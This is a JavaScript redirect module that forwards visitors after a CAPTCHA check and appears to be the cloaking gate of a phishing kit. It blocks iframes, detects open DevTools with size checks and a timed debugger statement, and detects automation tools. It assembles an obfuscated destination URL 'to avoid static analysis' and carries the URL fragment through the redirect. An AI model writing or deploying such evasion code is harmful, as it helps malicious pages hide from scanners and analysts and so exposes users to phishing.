/**
 * Enhanced Redirect Module
 * 
 * Securely handles the redirection after CAPTCHA verification
 * with multiple layers of protection against scanners and bots
 */

/**
 * Redirect to the protected content with secure token validation
 * @param {string} token The secure token generated during verification
 */
function redirectToProtectedContent(token) {
    // Validate the token against localStorage
    let storedToken;
    let tokenTimestamp = 0;
    
    try {
        storedToken = localStorage.getItem('secureToken');
        tokenTimestamp = parseInt(localStorage.getItem('tokenTimestamp') || '0');
    } catch (e) {
        // Handle case where localStorage is blocked or unavailable
        console.error('Error accessing localStorage:', e);
        // Continue with redirect anyway, don't block legitimate users with privacy settings
    }
    
    // Skip token validation if localStorage is unavailable (privacy browsers)
    const skipTokenValidation = storedToken === null && !localStorage.getItem('tokenTimestamp');
    
    // Only validate if not skipping
    if (!skipTokenValidation) {
        // Invalid or missing token
        if (!storedToken || storedToken !== token) {
            showRedirectError('Invalid security token. Please try again.');
            return;
        }
        
        // Expired token (10 minute validity)
        const tokenAge = Date.now() - tokenTimestamp;
        if (tokenAge > 600000) { // 10 minutes in milliseconds
            showRedirectError('Security token expired. Please try again.');
            return;
        }
    }
    
    // Get the destination URL
    let destinationUrl = '';
    
    if (typeof _u !== 'undefined') {
        // Use the assembleRedirectUrl function to construct the URL
        destinationUrl = assembleRedirectUrl();
    } else {
        // Fallback URL
        destinationUrl = 'https://example.com/redirect';
    }
    
    // Improved fragment handling
    // Get the fragment including the # character
    const urlFragment = window.location.hash;
    
    // Save fragment to both sessionStorage and localStorage for redundancy
    try {
        if (urlFragment) {
            console.log('Storing fragment for preservation:', urlFragment);
            sessionStorage.setItem('redirectFragment', urlFragment);
            localStorage.setItem('redirectFragment', urlFragment);
        }
    } catch (e) {
        console.error('Error storing fragment:', e);
        // Continue with redirect even if storage fails
    }
    
    // Append the fragment to the destination URL
    if (urlFragment) {
        // Make sure we don't add multiple # symbols
        if (destinationUrl.includes('#')) {
            // If destination already has a fragment, we need to merge them
            destinationUrl = destinationUrl.split('#')[0] + urlFragment;
        } else {
            destinationUrl += urlFragment;
        }
    }
    
    // Log redirection for debugging purposes
    
    
    // Perform the actual redirect
    window.location.href = destinationUrl;
}

/**
 * Final security checks before redirect
 * @returns {boolean} Whether all security checks passed
 */
function performFinalSecurityChecks() {
    // Check if we're in an iframe
    if (window !== window.top) {
        return false;
    }
    
    // Check if DevTools is open (can indicate an analyst)
    if (isDevToolsOpen()) {
        return false;
    }
    
    // Check for automation again
    const automation = detectAutomation();
    if (automation.webdriver || 
        automation.headlessUserAgent || 
        automation.phantomJS || 
        automation.seleniumAttrs ||
        automation.noPlugins) {
        return false;
    }
    
    return true;
}

/**
 * Attempts to detect if DevTools is open
 * @returns {boolean} True if DevTools appears to be open
 */
function isDevToolsOpen() {
    // Firefox & Chrome detection
    const threshold = 160; // Threshold for width/height difference
    
    // Get visible window dimensions
    const widthDiff = window.outerWidth - window.innerWidth;
    const heightDiff = window.outerHeight - window.innerHeight;
    
    // In many cases, significant size difference suggests dev tools
    if (widthDiff > threshold || heightDiff > threshold) {
        return true;
    }
    
    // ACTIVATED: Additional dev tools detection methods
    // Check for dev tools specific properties
    if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
        return true;
    }
    
    // Check for dev tools console
    if (window.console && (window.console.firebug || window.console.exception)) {
        return true;
    }
    
    // Check for dev tools timing
    const start = performance.now();
    debugger;
    const end = performance.now();
    if (end - start > 100) {
        return true;
    }
    
    return false; // Only return false if all checks pass
}

/**
 * Assemble the redirect URL using the obfuscated parts
 * @returns {string} The assembled redirect URL
 */
function assembleRedirectUrl() {
    try {
        // Further obfuscate the URL assembly
        const p = _u.p;
        const h = _u.h;
        
        // For the endpoint, we use _u.e as-is, do not reverse
        const e = _u.e;
        
        // Assemble with runtime calculations to avoid static analysis
        return p + (h.charAt(0) === '/' ? h : '/' + h) + e;
    } catch (e) {
        console.error('Error assembling redirect URL:', e);
        // Provide a fallback URL in case of error
        return 'https://example.com/redirect';
    }
}

/**
 * Display an error message on the redirect page
 * @param {string} message The error message to display
 */
function showRedirectError(message) {
    const redirectSection = document.getElementById('redirect-section');
    
    if (redirectSection) {
        redirectSection.innerHTML = `
            <div class="error-container">
                <div class="error-icon">⚠️</div>
                <div class="error-message">${message}</div>
                <a href="index.html" class="retry-button">Try Again</a>
            </div>
        `;
    }
}

/**
 * Manually try to restore fragment from sessionStorage if browser strips it
 * Call this function at destination page to recover fragments if needed
 */
function restoreFragmentIfNeeded() {
    try {
        // Try to get fragment from different storage options for redundancy
        let storedFragment = null;
        
        // Check sessionStorage first (primary storage)
        storedFragment = sessionStorage.getItem('redirectFragment');
        
        // If not in sessionStorage, try localStorage as backup
        if (!storedFragment) {
            storedFragment = localStorage.getItem('redirectFragment');
        }
        
        // Only proceed if we have a stored fragment and current URL has no fragment
        if (storedFragment && !window.location.hash) {
            console.log('Restoring fragment:', storedFragment);
            
            // No fragment in URL but we have a stored identifier
            // Append it to current URL without reload
            const newUrl = window.location.href + storedFragment;
            window.history.replaceState(null, '', newUrl);
            
            // Clean up
            try {
                sessionStorage.removeItem('redirectFragment');
                localStorage.removeItem('redirectFragment');
            } catch (e) {
                // Ignore cleanup errors
                console.error('Error cleaning up stored fragment:', e);
            }
        }
    } catch (e) {
        console.error('Error restoring fragment:', e);
    }
}

// Ensure we restore fragments on page load if we're at the destination
document.addEventListener('DOMContentLoaded', function() {
    // If we're at a destination page (not index.html), check for fragments to restore
    if (!window.location.pathname.includes('index.html')) {
        restoreFragmentIfNeeded();
    }
}); 